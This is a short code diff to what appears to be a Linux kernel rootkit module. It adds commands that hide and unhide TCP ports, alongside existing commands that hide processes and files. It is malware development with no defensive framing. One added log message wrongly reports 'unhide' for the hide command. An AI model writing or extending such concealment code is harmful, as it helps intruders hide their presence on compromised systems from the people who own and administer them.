@@ -764,6 +764,17 @@ int execute_command(const char __user *str, size_t length)
         pr_info("Got unhide pid command\n");
         str += sizeof(CFG_UNHIDE_PID);
         pid_remove(str);
+	    
+    } else if (strcmp(str, CFG_HIDE_PORT) == 0) {
+        pr_info("Got unhide port command\n");
+        str += sizeof(CFG_HIDE_PORT);
+	hide_tcp4_port(str);
+	    
+    } else if (strcmp(str, CFG_UNHIDE_PORT) == 0) {
+        pr_info("Got unhide port command\n");
+        str += sizeof(CFG_UNHIDE_PORT);
+        unhide_tcp4_port(str);
+	    
     } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
         pr_info("Got hide file command\n");
         str += sizeof(CFG_HIDE_FILE);
